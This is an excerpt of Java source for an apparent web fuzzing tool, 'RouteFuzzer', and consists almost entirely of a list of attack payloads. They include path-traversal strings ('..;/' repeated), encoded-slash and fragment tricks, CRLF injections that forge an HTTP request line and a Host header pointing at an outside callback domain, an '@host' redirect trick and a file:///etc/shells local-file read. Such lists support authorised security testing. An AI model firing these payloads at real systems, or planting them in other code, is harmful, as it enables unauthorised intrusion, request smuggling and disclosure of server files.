...
public class RouteFuzzer {
    ...
    private static final String[][] PAYLOAD_DATA = {
            ...
            {"{path}/", "{path}/"},
            {"{path}%2f", "{path}%2f"},
            {"{path_url_encoded}", "{path_url}"},
            {"{path_double_url_encoded}", "{path_2url}"},
            {"{path}#", "{path}#"},
            {"{path}%23", "{path}%23"},
            {"{path}?", "{path}?"},
            {"{path}%3f", "{path}%3f"},
            ...
            {"{path}%20HTTP/1.1%0D%0AHost:%20{fuzz}.abga5.wi11.fun%0D%0Ax2x:%20", "{path}CRLF"},
            {"file:///etc/shells", "file protocol"},
            {"{path}/%20H", "ng crlf"},
            {"{path}/%20HTTP/19.91%0D%0AX:%20x", "ng crlf2"},
            {"{path}/%20HTTP/1.1%0D%0AHost:%20{fuzz}.abga5.wi11.fun%0D%0Ax2x:", "ng crlf3"},
            {"{path1}{path2}", "{path1}{path2}"},
            {"{path}..", "{path}.."},
            {"{path}@{fuzz}.abga5.wi11.fun", "{path}@host"},
            {"{path}/..;/..;/..;/..;/..;", "{path}/..;/X5"},
            {"{path}/..;", "{path}/..;"},
